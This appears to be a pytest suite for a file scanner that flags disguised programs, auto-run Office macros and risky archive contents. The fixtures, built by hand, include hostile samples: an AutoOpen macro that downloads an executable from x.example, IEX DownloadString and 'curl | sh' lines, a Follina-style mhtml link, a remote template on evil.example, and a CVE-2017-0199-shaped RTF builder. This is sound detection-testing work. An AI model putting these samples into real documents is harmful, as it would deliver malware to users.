"""Single-file static checks: S7 (type mismatch), S8 (Office auto-run) and S9 (archive contents).

Every fixture is built here from real bytes: PE/ELF/Mach-O headers, a tiny PDF and
PNG, zips, an ISO 9660 image, a CAB, RTFs, and OLE2 files written by hand,
including a real VBA project (MS-OVBA dir stream and compressed module source)
that olevba parses as if Word had saved it. Nothing is mocked.
"""

import asyncio
import base64
import builtins
import gzip
import io
import socket
import struct
import subprocess
import tarfile
import time
import uuid
import zipfile
import zlib
from types import SimpleNamespace

import pytest
from pydantic import ValidationError

from app.pipeline import TEXT_CHECKS, Upload, run_check
from app.rules.engine import Finding, decide, load_table
from app.schemas import Submission
from app.static_scan import office
from app.static_scan.file_scan import S7, S8, S9, FileKind, detect_type, scan_file


# ---------------------------------------------------------------- byte fixtures

def pe(*, dll=False) -> bytes:
    """A DOS header pointing at a PE header, padded like a small program."""
    coff = struct.pack("<HHIIIHH", 0x14C, 1, 0, 0, 0, 0xE0, 0x2102 if dll else 0x0102)
    return (b"MZ" + bytes(0x3A) + struct.pack("<I", 0x40) + b"PE\0\0" + coff).ljust(1024, b"\0")


ELF = b"\x7fELF\x02\x01\x01" + bytes(57)
MACHO_64 = b"\xcf\xfa\xed\xfe" + bytes(28)
TINY_PDF = (b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n")
LNK = b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46" + bytes(56)


def png() -> bytes:
    def chunk(kind, data):
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(b"\x00\x00")) + chunk(b"IEND", b""))


def make_zip(entries: dict[str, bytes], compression=zipfile.ZIP_DEFLATED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression) as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
    return buf.getvalue()


def set_encrypted_flag(zip_bytes: bytes) -> bytes:
    """zipfile can't encrypt, so set general-purpose bit 0 in every local and central header by hand."""
    b = bytearray(zip_bytes)
    for sig, flag_at in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        i = b.find(sig)
        while i != -1:
            b[i + flag_at] |= 1
            i = b.find(sig, i + 4)
    return bytes(b)


def set_declared_size(zip_bytes: bytes, size: int) -> bytes:
    """Make every central-directory entry claim an uncompressed size it doesn't have."""
    b = bytearray(zip_bytes)
    i = b.find(b"PK\x01\x02")
    while i != -1:
        b[i + 24:i + 28] = struct.pack("<I", size)
        i = b.find(b"PK\x01\x02", i + 4)
    return bytes(b)


CONTENT_TYPES = b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'


def ooxml(folder="word", parts: dict[str, bytes] | None = None) -> bytes:
    main = {"word": "document.xml", "xl": "workbook.xml", "ppt": "presentation.xml"}[folder]
    return make_zip({"[Content_Types].xml": CONTENT_TYPES, f"{folder}/{main}": b"<doc>Quarterly report</doc>",
                     **(parts or {})})


def rels(*relationships: tuple[str, str]) -> bytes:
    body = "".join(
        f'<Relationship Id="rId{i}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{t}" '
        f'Target="{target}" TargetMode="External"/>'
        for i, (t, target) in enumerate(relationships, 1))
    return (f'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f"{body}</Relationships>").encode()


# ---------------------------------------------------------------- OLE2 and VBA, written by hand

ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF


def make_ole(streams: dict[str, bytes], root_clsid: bytes = bytes(16)) -> bytes:
    """A minimal OLE2 compound file (v3, 512-byte sectors, one FAT sector).

    Every stream must be at least 4096 bytes so it lives in normal sectors and no
    mini stream is needed. Storages come from the "/" in stream paths.
    """
    tree: dict = {}
    for path, content in streams.items():
        node = tree
        *dirs, leaf = path.split("/")
        for d in dirs:
            node = node.setdefault(d, {})
        node[leaf] = content
    entries: list = []  # [name, type, content, child ids]

    def add(name, node):
        idx = len(entries)
        entries.append(None)
        if isinstance(node, dict):
            entries[idx] = [name, 5 if idx == 0 else 1, None, [add(k, v) for k, v in node.items()]]
        else:
            assert len(node) >= 4096, f"{name} must be >= 4096 bytes to stay out of the mini stream"
            entries[idx] = [name, 2, node, []]
        return idx

    add("Root Entry", tree)
    child, right = {}, {}
    for idx, (_, _, _, kids) in enumerate(entries):
        if kids:  # siblings as a right-leaning chain: a valid, if unbalanced, tree
            child[idx] = kids[0]
            right.update(zip(kids, kids[1:]))
    n_dir = -(-len(entries) // 4)
    fat = [FATSECT] + [s + 1 for s in range(1, n_dir)] + [ENDOFCHAIN]
    starts, body = {}, b""
    for idx, (_, kind, content, _) in enumerate(entries):
        if kind == 2:
            n = -(-len(content) // 512)
            starts[idx] = len(fat)
            fat += [len(fat) + i + 1 for i in range(n - 1)] + [ENDOFCHAIN]
            body += content.ljust(n * 512, b"\0")
    assert len(fat) <= 128

    def dirent(idx):
        name, kind, content, _ = entries[idx]
        n = name.encode("utf-16-le") + b"\0\0"
        start = starts.get(idx, ENDOFCHAIN if kind == 5 else 0)
        return (n.ljust(64, b"\0") + struct.pack("<HBB", len(n), kind, 1)
                + struct.pack("<III", NOSTREAM, right.get(idx, NOSTREAM), child.get(idx, NOSTREAM))
                + (root_clsid if idx == 0 else bytes(16)) + bytes(20)
                + struct.pack("<IQ", start, len(content) if content else 0))

    unused = (bytes(64) + struct.pack("<HBB", 0, 0, 0) + struct.pack("<III", NOSTREAM, NOSTREAM, NOSTREAM)
              + bytes(36) + struct.pack("<IQ", 0, 0))
    directory = b"".join(dirent(i) for i in range(len(entries))) + unused * (n_dir * 4 - len(entries))
    header = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(16) + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6)
              + bytes(6) + struct.pack("<IIIIIIIII", 0, 1, 1, 0, 4096, ENDOFCHAIN, 0, ENDOFCHAIN, 0)
              + struct.pack("<I", 0) + b"\xff" * (4 * 108))
    fat_sector = b"".join(struct.pack("<I", x) for x in fat).ljust(512, b"\xff")
    return header + fat_sector + directory + body


def ovba_compress(raw: bytes) -> bytes:
    """MS-OVBA compression with literal tokens only: valid, just not smaller."""
    out = bytearray(b"\x01")
    for start in range(0, len(raw), 3584):  # 3584 literals encode to 4032 bytes, under the 4098 chunk limit
        chunk = raw[start:start + 3584]
        body = b"".join(b"\x00" + chunk[i:i + 8] for i in range(0, len(chunk), 8))
        out += struct.pack("<H", 0xB000 | (len(body) - 1)) + body
    return bytes(out)


def vba_streams(source: str, root: str = "") -> dict[str, bytes]:
    """The streams of a VBA project with one standard module, Module1 (MS-OVBA 2.3)."""
    def rec(rid, payload):
        return struct.pack("<HI", rid, len(payload)) + payload

    p16, p32 = (lambda v: struct.pack("<H", v)), (lambda v: struct.pack("<I", v))
    mod, umod = b"Module1", "Module1".encode("utf-16-le")
    d = (rec(0x01, p32(1)) + rec(0x02, p32(0x409)) + rec(0x14, p32(0x409)) + rec(0x03, p16(1252))
         + rec(0x04, b"VBAProject")
         + rec(0x05, b"") + struct.pack("<HI", 0x40, 0)        # docstring
         + rec(0x06, b"") + struct.pack("<HI", 0x3D, 0)        # help file
         + rec(0x07, p32(0)) + rec(0x08, p32(0))
         + struct.pack("<HIIH", 0x09, 4, 1, 0)                 # version
         + rec(0x0C, b"") + struct.pack("<HI", 0x3C, 0)        # constants
         + p16(0x0F) + struct.pack("<IH", 2, 1) + rec(0x13, p16(0xFFFF))  # one module
         + rec(0x19, mod) + rec(0x1A, mod) + struct.pack("<HI", 0x32, len(umod)) + umod
         + rec(0x31, p32(0)) + rec(0x2C, p16(0xFFFF)) + struct.pack("<HI", 0x21, 0) + struct.pack("<HI", 0x2B, 0)
         + struct.pack("<HI", 0x10, 0))
    code = b'Attribute VB_Name = "Module1"\r\n' + source.encode("cp1252")
    project = b'ID="{00000000-0000-0000-0000-000000000000}"\r\nModule=Module1\r\nName="VBAProject"\r\n'
    pre = f"{root}/" if root else ""
    # Padding keeps each stream over 4096 bytes; it sits after the dir terminator and the code.
    return {
        pre + "PROJECT": project.ljust(4096, b" "),
        pre + "VBA/dir": ovba_compress(d.ljust(3800, b"\0")),
        pre + "VBA/_VBA_PROJECT": b"\xcc\x61\xff\xff\x00\x00\x00".ljust(4096, b"\0"),
        pre + "VBA/Module1": ovba_compress(code.ljust(3800, b" ")),
    }


AUTO_OPEN = ('Sub AutoOpen()\r\n  Set s = CreateObject("WScript.Shell")\r\n'
             '  s.Run "powershell -w hidden -c iwr http://x.example/a.exe"\r\nEnd Sub\r\n')
WORKBOOK_OPEN = 'Private Sub Workbook_Open()\r\n  Shell "cmd /c calc"\r\nEnd Sub\r\n'
DOC_CLOSE = 'Sub Document_Close()\r\n  Kill "C:\\temp\\x"\r\nEnd Sub\r\n'
BUTTON_ONLY = 'Sub CommandButton1_Click()\r\n  MsgBox "Thanks"\r\nEnd Sub\r\n'
PLAIN_MACRO = 'Sub FormatTable()\r\n  Selection.Font.Bold = True\r\nEnd Sub\r\n'


def word_doc(source: str | None = None) -> bytes:
    streams = {"WordDocument": bytes(4096)}
    if source is not None:
        streams.update(vba_streams(source, root="Macros"))
    return make_ole(streams)


def docm(source: str, folder="word") -> bytes:
    return ooxml(folder, {f"{folder}/vbaProject.bin": make_ole(vba_streams(source))})


# ---------------------------------------------------------------- ISO 9660 and CAB, written by hand

def make_iso(files: dict[str, bytes], *, joliet=False) -> bytes:
    """One root directory; with joliet=True a Joliet volume carries the real (Unicode) names."""
    S = 2048

    def both16(v):
        return struct.pack("<H", v) + struct.pack(">H", v)

    def both32(v):
        return struct.pack("<I", v) + struct.pack(">I", v)

    def record(name, lba, size, is_dir):
        rec = (b"\0" + both32(lba) + both32(size) + bytes(7) + bytes([2 if is_dir else 0, 0, 0]) + both16(1)
               + bytes([len(name)]) + name)
        rec = rec + b"\0" if (len(rec) + 1) % 2 else rec
        return bytes([len(rec) + 1]) + rec

    lba, placed, body = 22, {}, b""
    for name, content in files.items():
        placed[name] = lba
        n = max(1, -(-len(content) // S))
        body += content.ljust(n * S, b"\0")
        lba += n

    def directory(self_lba, unicode):
        recs = record(b"\0", self_lba, S, True) + record(b"\1", self_lba, S, True)
        for name, content in files.items():
            raw = name.encode("utf-16-be") if unicode else name.upper().encode("ascii", "replace") + b";1"
            recs += record(raw, placed[name], len(content), False)
        return recs.ljust(S, b"\0")

    def descriptor(kind, root_lba, escape=b""):
        v = bytearray(S)
        v[0], v[1:6], v[6] = kind, b"CD001", 1
        v[88:88 + len(escape)] = escape
        v[128:132] = both16(S)
        v[156:190] = record(b"\0", root_lba, S, True)
        return bytes(v)

    end = bytes([255]) + b"CD001\x01" + bytes(S - 7)
    volumes = [descriptor(1, 20)] + ([descriptor(2, 21, b"%/E")] if joliet else []) + [end]
    volumes += [bytes(S)] * (4 - len(volumes))
    return bytes(16 * S) + b"".join(volumes) + directory(20, False) + directory(21, True) + body


def make_cab(names: list[str]) -> bytes:
    files = b"".join(struct.pack("<IIHHHH", 10, 0, 0, 0, 0, 0x20) + n.encode() + b"\0" for n in names)
    header = (b"MSCF" + bytes(4) + struct.pack("<I", 44 + len(files)) + bytes(4) + struct.pack("<I", 44)
              + bytes(4) + bytes([3, 1]) + struct.pack("<HHHHH", 1, len(names), 0, 0, 0))
    return header + bytes(8) + files  # one empty CFFOLDER, then the CFFILE records


def rtf_ole2link(url: str) -> bytes:
    """An RTF with an auto-updating OLE2Link object, the shape of CVE-2017-0199."""
    native = b"\xd0\xcf\x11\xe0" + bytes(20) + url.encode("utf-16-le") + bytes(8)
    name = b"OLE2Link\0"
    ole1 = (struct.pack("<II", 0x0501, 2) + struct.pack("<I", len(name)) + name + struct.pack("<II", 0, 0)
            + struct.pack("<I", len(native)) + native)
    return (rb"{\rtf1{\object\objautlink\objupdate\rsltpict{\*\objclass OLE2Link}{\*\objdata "
            + ole1.hex().encode() + rb"}}}")


# ---------------------------------------------------------------- helpers

def by_check(findings: list[Finding]) -> dict[str, Finding]:
    return {f.check: f for f in findings}


def finding(name: str, data: bytes, check: str) -> Finding:
    return by_check(scan_file(name, data))[check]


def text_of(f: Finding) -> str:
    return " | ".join(e.summary for e in f.evidence)


# ---------------------------------------------------------------- detect_type

class TestDetectType:
    @pytest.mark.parametrize("data,label,family", [
        (pe(), "Windows program", "executable"),
        (pe(dll=True), "Windows library (DLL)", "executable"),
        (b"MZ" + bytes(100), "Windows program", "executable"),
        (ELF, "Linux program", "executable"),
        (b"\xfe\xed\xfa\xce" + bytes(28), "Mac program", "executable"),
        (b"\xfe\xed\xfa\xcf" + bytes(28), "Mac program", "executable"),
        (b"\xce\xfa\xed\xfe" + bytes(28), "Mac program", "executable"),
        (MACHO_64, "Mac program", "executable"),
        (b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + bytes(40), "Mac program", "executable"),
        (b"\xca\xfe\xba\xbf\x00\x00\x00\x02" + bytes(40), "Mac program", "executable"),
        (b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + bytes(40), "Java class file", "executable"),
        (LNK, "Windows shortcut", "shortcut"),
        (b"#!/bin/bash\ncurl x | sh\n", "shell script", "script"),
        (b"#!/usr/bin/env python3\nprint(1)\n", "Python script", "script"),
        (TINY_PDF, "PDF document", "document"),
        (b"\n\n%PDF-1.7\n", "PDF document", "document"),
        (rb"{\rtf1\ansi Hello}", "RTF document", "document"),
        (b"Rar!\x1a\x07\x00" + bytes(20), "RAR archive", "archive"),
        (b"Rar!\x1a\x07\x01\x00" + bytes(20), "RAR archive", "archive"),
        (b"7z\xbc\xaf\x27\x1c" + bytes(26), "7z archive", "archive"),
        (gzip.compress(b"hello"), "gzip file", "archive"),
        (b"BZh91AY&SY" + bytes(20), "bzip2 file", "archive"),
        (b"\xfd7zXZ\x00" + bytes(20), "xz file", "archive"),
        (make_cab(["a.txt"]), "CAB archive", "archive"),
        (bytes(0x8001) + b"CD001", "ISO disk image", "disk_image"),
        (bytes(0x8801) + b"CD001", "ISO disk image", "disk_image"),
        (bytes(0x9001) + b"CD001", "ISO disk image", "disk_image"),
        (png(), "PNG image", "image"),
        (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00" + bytes(20), "JPEG image", "image"),
        (b"GIF89a" + bytes(20), "GIF image", "image"),
        (b"RIFF\x24\x00\x00\x00WEBPVP8 " + bytes(20), "WEBP image", "image"),
        (b"\x00\x00\x00\x18ftypisom" + bytes(20), "MP4 video", "image"),
        (b"\x00\x00\x00\x14ftypqt  " + bytes(20), "QuickTime video", "image"),
        (b"Meeting notes\nBring the signed NDA.\n", "text file", "text"),
        ("Café à côté\n".encode("cp1252"), "text file", "text"),
        (b"", "empty file", "unknown"),
        (bytes(range(256)) * 4, "file of unknown type", "unknown"),
    ])
    def test_magic(self, data, label, family):
        kind = detect_type(data)
        assert (kind.label, kind.family) == (label, family)

    def test_tar(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            info = tarfile.TarInfo("notes.txt")
            info.size = 2
            tf.addfile(info, io.BytesIO(b"hi"))
        assert detect_type(buf.getvalue()).label == "tar archive"

    @pytest.mark.parametrize("text,label", [
        ('Set s = CreateObject("WScript.Shell")\r\ns.Run "calc"\r\n', "VBScript"),
        ("IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')", "PowerShell script"),
        ("$p | iex", "PowerShell script"),
        ("powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "PowerShell script"),
        ("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "PowerShell script"),
        ('var s = new ActiveXObject("WScript.Shell"); s.Run("calc");', "JScript"),
        ("@echo off\r\ncurl -o a.exe http://x.example/a.exe\r\n", "Windows batch script"),
        ("\r\nrem setup\r\n@ECHO OFF\r\nstart a.exe\r\n", "Windows batch script"),
        ('<html><head><hta:application id="x"/></head></html>', "HTML application (HTA)"),
        ("[InternetShortcut]\r\nURL=file://evil.example/share/a.exe\r\n", "internet shortcut"),
    ])
    def test_scripts_by_content(self, text, label):
        kind = detect_type(text.encode())
        assert kind.label == label
        assert kind.family in ("script", "shortcut")

    @pytest.mark.parametrize("text", [
        "Start the shell with iex (interactive Elixir) and type h() for help.",
        "We use PowerShell at work; please don't run scripts from strangers.",
        "Run the installer, then echo off the lights.\n@echo off is how batch files start.",
    ])
    def test_prose_about_scripts_is_text(self, text):
        assert detect_type(text.encode()).family == "text"

    def test_utf16_powershell(self):
        data = "\ufeffIEX (New-Object Net.WebClient).DownloadString('http://x')".encode("utf-16-le")
        assert detect_type(data).label == "PowerShell script"

    @pytest.mark.parametrize("folder,label", [("word", "Word document"), ("xl", "Excel spreadsheet"),
                                              ("ppt", "PowerPoint presentation")])
    def test_ooxml(self, folder, label):
        assert detect_type(ooxml(folder)).label == label
        assert detect_type(ooxml(folder, {f"{folder}/vbaProject.bin": b"x"})).label == label + " with macros"

    def test_jar_and_plain_zip(self):
        jar = make_zip({"META-INF/MANIFEST.MF": b"Main-Class: A\n", "A.class": b"\xca\xfe\xba\xbe\x00\x00\x00\x34"})
        assert detect_type(jar).label == "Java program (JAR)"
        assert detect_type(make_zip({"a.txt": b"hi"})).label == "ZIP archive"

    def test_ole(self):
        assert detect_type(word_doc()).label == "Word document"
        assert detect_type(word_doc(PLAIN_MACRO)).label == "Word document with macros"
        assert detect_type(make_ole({"Workbook": bytes(4096)})).label == "Excel spreadsheet"
        msi = make_ole({"x": bytes(4096)}, root_clsid=uuid.UUID("000C1084-0000-0000-C000-000000000046").bytes_le)
        assert (detect_type(msi).label, detect_type(msi).family) == ("Windows installer", "executable")
        encrypted = make_ole({"EncryptionInfo": bytes(4096), "EncryptedPackage": bytes(4096)})
        assert detect_type(encrypted).label == "password-protected Office document"
        assert detect_type(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(100)).label == "damaged Office file"

    def test_file_kind_is_frozen(self):
        kind = detect_type(TINY_PDF)
        assert isinstance(kind, FileKind) and kind.mime == "application/pdf"
        with pytest.raises(ValidationError):
            kind.label = "x"

    def test_batch_pattern_has_no_backtracking_blowup(self):
        start = time.monotonic()
        detect_type(b"\n" * 200_000 + b"x")
        assert time.monotonic() - start < 2


# ---------------------------------------------------------------- S7

class TestS7TypeMismatch:
    def test_pe_named_pdf(self):
        f = finding("report.pdf", pe(), S7)
        assert f.status == "hit"
        assert text_of(f) == "report.pdf is really a Windows program (starts with MZ)"

    def test_mz_padding_named_pdf(self):
        assert finding("report.pdf", b"MZ" + bytes(4000), S7).status == "hit"

    @pytest.mark.parametrize("name,data", [
        ("invoice.jpg", ELF),
        ("offer.docx", MACHO_64),
        ("photo.png", LNK),
        ("contract.pdf", bytes(0x8001) + b"CD001" + bytes(100)),
        ("notes.txt", b'Set s = CreateObject("WScript.Shell")'),
        ("statement.xls", b"#!/bin/sh\ncurl x | sh\n"),
        ("archive.zip", pe()),
    ])
    def test_program_behind_document_extension(self, name, data):
        f = finding(name, data, S7)
        assert f.status == "hit"
        assert "is really" in text_of(f)

    def test_invoice_jpg_evidence(self):
        assert text_of(finding("invoice.jpg", ELF, S7)) == "invoice.jpg is really a Linux program (starts with ELF)"

    @pytest.mark.parametrize("name", ["resume.pdf.exe", "Invoice.PDF.scr", "photo.jpg.js", "brief.docx.lnk",
                                      "salary.xlsx.hta", "scan.pdf .exe", "pics.zip.iso"])
    def test_double_extension(self, name):
        f = finding(name, b"anything at all", S7)
        assert f.status == "hit"
        assert "really ends in" in text_of(f)

    @pytest.mark.parametrize("name", ["invoice\u202efdp.exe", "photo\u2066gpj.scr\u2069", "report\u200f.pdf"])
    def test_bidi_controls(self, name):
        f = finding(name, b"x", S7)
        assert f.status == "hit"
        assert "right-to-left" in text_of(f)
        assert "\u202e" not in text_of(f)  # the evidence never re-renders the trick

    def test_rtlo_names_real_ending(self):
        assert "it really ends in .exe" in text_of(finding("invoice\u202efdp.exe", pe(), S7))

    @pytest.mark.parametrize("name", ["report.pdf" + " " * 20 + ".exe", "Invoice" + " " * 12 + ".js",
                                      "Q3 numbers.xlsx" + "\u2800" * 8 + ".bat"])
    def test_spaces_hide_the_extension(self, name):
        f = finding(name, b"x", S7)
        assert f.status == "hit"
        assert "out of view" in text_of(f)

    def test_real_pdf(self):
        f = finding("report.pdf", TINY_PDF, S7)
        assert f.status == "clear"
        assert text_of(f) == "report.pdf is a real PDF document"

    def test_real_png(self):
        assert text_of(finding("logo.png", png(), S7)) == "logo.png is a real PNG image"

    @pytest.mark.parametrize("name,data", [
        ("setup.exe", pe()),
        ("python-3.12.1-amd64.exe", pe()),
        ("jquery.min.js", b"!function(e){return e}(window);"),
        ("my.backup.2024.tar.gz", gzip.compress(b"x")),
        ("report", pe()),
        ("report.pdf", bytes(range(256))),
        ("report.pdf", b""),
        ("notes.txt", b"Call me at 5pm about the offer."),
        ("notes.txt", b"MZ Industries: quarterly numbers attached."),
        ("lib.zip", make_zip({"META-INF/MANIFEST.MF": b"x", "A.class": b"\xca\xfe\xba\xbe\x00\x00\x00\x34"})),
    ])
    def test_clear(self, name, data):
        assert finding(name, data, S7).status == "clear"

    def test_honest_program_evidence(self):
        assert "doesn't pretend to be a document" in text_of(finding("setup.exe", pe(), S7))


# ---------------------------------------------------------------- S9

class TestS9ArchiveContents:
    def test_zip_with_double_extension_program(self):
        f = finding("documents.zip", make_zip({"invoice.pdf.exe": pe(), "readme.txt": b"hi"}), S9)
        assert f.status == "hit"
        assert "invoice.pdf.exe (a Windows program)" in text_of(f)

    def test_zip_with_program_named_as_document(self):
        f = finding("docs.zip", make_zip({"invoice.pdf": pe()}), S9)
        assert f.status == "hit"
        assert "invoice.pdf, which is really a Windows program" in text_of(f)

    @pytest.mark.parametrize("entry", ["run.bat", "start.cmd", "a.vbs", "x.ps1", "help.lnk", "go.sh", "tool.jar",
                                       "folder/inner/payload.scr", "Game.app/Contents/MacOS/Game", "disk.iso"])
    def test_risky_names(self, entry):
        assert finding("x.zip", make_zip({entry: b"x"}), S9).status == "hit"

    def test_script_content_in_text_entry(self):
        f = finding("x.zip", make_zip({"notes.txt": b"IEX (New-Object Net.WebClient).DownloadString('h')"}), S9)
        assert f.status == "hit"

    def test_only_documents_and_images(self):
        f = finding("photos.zip", make_zip({"invoice.pdf": TINY_PDF, "logo.png": png(), "dir/notes.txt": b"hi"}), S9)
        assert f.status == "clear"
        assert text_of(f) == "none of the 3 files in the archive is a program or script"

    def test_password_protected(self):
        data = set_encrypted_flag(make_zip({"invoice.pdf": TINY_PDF}))
        f = finding("invoice.zip", data, S9)
        assert f.status == "hit"
        assert "the archive is password-protected, so its contents are hidden" in text_of(f)

    def test_password_protected_still_shows_names(self):
        f = finding("x.zip", set_encrypted_flag(make_zip({"setup.exe": pe()})), S9)
        assert "setup.exe (a Windows program)" in text_of(f)

    def test_ratio_bomb_entry_is_not_opened(self):
        data = make_zip({"big.bin": bytes(2 * 1024 * 1024)})  # ~1000:1
        f = finding("x.zip", data, S9)
        assert f.status == "unknown"
        assert "zip bomb" in text_of(f)

    def test_declared_size_over_limit_is_not_opened(self):
        data = set_declared_size(make_zip({"data.bin": b"x" * 100}, zipfile.ZIP_STORED), 200 * 1024 * 1024)
        f = finding("x.zip", data, S9)
        assert f.status == "unknown"
        assert "too big" in text_of(f)

    def test_bomb_entry_with_risky_name_is_still_a_hit(self):
        data = make_zip({"big.bin": bytes(2 * 1024 * 1024), "run.exe": pe()})
        assert finding("x.zip", data, S9).status == "hit"

    def test_too_many_entries(self):
        data = make_zip({f"f{i}.txt": b"" for i in range(10_001)}, zipfile.ZIP_STORED)
        f = finding("x.zip", data, S9)
        assert f.status == "unknown"
        assert "10,001" in text_of(f)

    def test_nested_zip(self):
        inner = make_zip({"setup.exe": pe()})
        f = finding("outer.zip", make_zip({"docs/inner.zip": inner, "a.txt": b"hi"}), S9)
        assert f.status == "hit"
        assert "setup.exe (a Windows program) inside docs/inner.zip" in text_of(f)

    def test_nested_encrypted_zip(self):
        inner = set_encrypted_flag(make_zip({"a.pdf": TINY_PDF}))
        assert "password-protected" in text_of(finding("outer.zip", make_zip({"inner.zip": inner}), S9))

    def test_damaged_zip(self):
        f = finding("x.zip", b"PK\x03\x04" + bytes(40), S9)
        assert f.status == "unknown"
        assert "damaged" in text_of(f)

    def test_office_package_is_not_an_archive(self):
        f = finding("report.docx", ooxml("word", {"word/media/image1.png": png()}), S9)
        assert f.status == "clear"
        assert text_of(f).startswith("not an archive")

    def test_office_package_with_a_program_part(self):
        data = ooxml("word", {"word/embeddings/payload.exe": pe(), "word/media/x.bin": ELF})
        f = finding("report.docx", data, S9)
        assert f.status == "hit"
        assert "payload.exe" in text_of(f) and "x.bin" in text_of(f)

    def test_office_xml_quoting_a_script_is_fine(self):
        data = ooxml("word", {"word/document.xml": b'<w:t>CreateObject("WScript.Shell")</w:t>'})
        assert finding("howto.docx", data, S9).status == "clear"

    def test_not_an_archive(self):
        f = finding("report.pdf", TINY_PDF, S9)
        assert (f.status, text_of(f)) == ("clear", "not an archive")

    @pytest.mark.parametrize("data,label", [(b"Rar!\x1a\x07\x01\x00" + bytes(40), "RAR archive"),
                                            (b"7z\xbc\xaf\x27\x1c" + bytes(40), "7z archive")])
    def test_unlistable_archives(self, data, label):
        f = finding("x.rar", data, S9)
        assert f.status == "unknown"
        assert f"can't list a {label} here; the decoy machine will open it" in text_of(f)

    def test_tar(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            for name, content in (("README.md", b"hi"), ("bin/helper", ELF)):
                info = tarfile.TarInfo(name)
                info.size = len(content)
                tf.addfile(info, io.BytesIO(content))
        f = finding("project.tar", buf.getvalue(), S9)
        assert f.status == "hit"
        assert "bin/helper, which is really a Linux program" in text_of(f)
        assert finding("project.tar.gz", gzip.compress(buf.getvalue()), S9).status == "hit"

    def test_gzip_of_a_program(self):
        buf = io.BytesIO()
        with gzip.GzipFile(filename="invoice.pdf.exe", mode="wb", fileobj=buf) as gz:
            gz.write(pe())
        assert "invoice.pdf.exe (a Windows program)" in text_of(finding("invoice.gz", buf.getvalue(), S9))
        f = finding("x.gz", gzip.compress(pe()), S9)
        assert (f.status, text_of(f)) == ("hit", "the compressed file holds a Windows program (starts with MZ)")
        assert finding("notes.gz", gzip.compress(b"just notes"), S9).status == "clear"

    def test_iso_with_program(self):
        f = finding("disk.iso", make_iso({"README.TXT": b"hi", "SETUP.EXE": pe()}), S9)
        assert f.status == "hit"
        assert "SETUP.EXE (a Windows program)" in text_of(f)

    def test_iso_joliet_names(self):
        f = finding("cv.iso", make_iso({"Resume.pdf.lnk": LNK}, joliet=True), S9)
        assert "Resume.pdf.lnk (a Windows shortcut)" in text_of(f)

    def test_iso_program_named_as_document(self):
        assert finding("cv.iso", make_iso({"CV.PDF": pe()}), S9).status == "hit"

    def test_iso_clean(self):
        f = finding("photos.iso", make_iso({"A.PNG": png(), "B.PDF": TINY_PDF}), S9)
        assert (f.status, text_of(f)) == ("clear", "none of the 2 files in the disk image is a program or script")

    def test_cab(self):
        assert "setup.exe" in text_of(finding("x.cab", make_cab(["readme.txt", "setup.exe"]), S9))
        assert finding("x.cab", make_cab(["readme.txt"]), S9).status == "unknown"  # only names are readable


# ---------------------------------------------------------------- S8

class TestS8OfficeAutorun:
    def test_doc_with_auto_open_macro(self):
        f = finding("invoice.doc", word_doc(AUTO_OPEN), S8)
        assert f.status == "hit"
        assert text_of(f) == ("invoice.doc has a macro that runs when you open it (AutoOpen) "
                              "and uses Shell, WScript.Shell, CreateObject")

    def test_docm_with_auto_open_macro(self):
        f = finding("invoice.docm", docm(AUTO_OPEN), S8)
        assert f.status == "hit"
        assert "(AutoOpen)" in text_of(f)

    def test_xlsm_with_workbook_open(self):
        f = finding("budget.xlsm", docm(WORKBOOK_OPEN, folder="xl"), S8)
        assert f.status == "hit"
        assert "when you open it (Workbook_Open) and uses Shell" in text_of(f)

    def test_close_trigger(self):
        f = finding("memo.doc", word_doc(DOC_CLOSE), S8)
        assert f.status == "hit"
        assert "when you close it (Document_Close)" in text_of(f)

    @pytest.mark.parametrize("source", [PLAIN_MACRO, BUTTON_ONLY])
    def test_macros_that_need_a_click(self, source):
        f = finding("table.doc", word_doc(source), S8)
        assert f.status == "clear"
        assert text_of(f) == "table.doc has macros that need a click to run"

    def test_doc_without_macros(self):
        assert text_of(finding("letter.doc", word_doc(), S8)) == "letter.doc has no macros"
        assert text_of(finding("letter.docx", ooxml(), S8)) == "letter.docx has no macros"

    def test_remote_template(self):
        data = ooxml("word", {"word/_rels/settings.xml.rels": rels(("attachedTemplate", "https://evil.example/t.dotm"))})
        f = finding("offer.docx", data, S8)
        assert f.status == "hit"
        assert text_of(f) == "offer.docx opens a remote template from evil.example when you open it"

    def test_remote_template_on_a_network_share(self):
        data = ooxml("word", {"word/_rels/settings.xml.rels": rels(("attachedTemplate", r"\\203.0.113.9\share\t.dotm"))})
        assert "from 203.0.113.9" in text_of(finding("offer.docx", data, S8))

    def test_follina_ole_object(self):
        data = ooxml("word", {"word/_rels/document.xml.rels":
                              rels(("oleObject", "mhtml:http://evil.example/x.html!x-usc:http://evil.example/x.html"))})
        f = finding("cv.docx", data, S8)
        assert f.status == "hit"
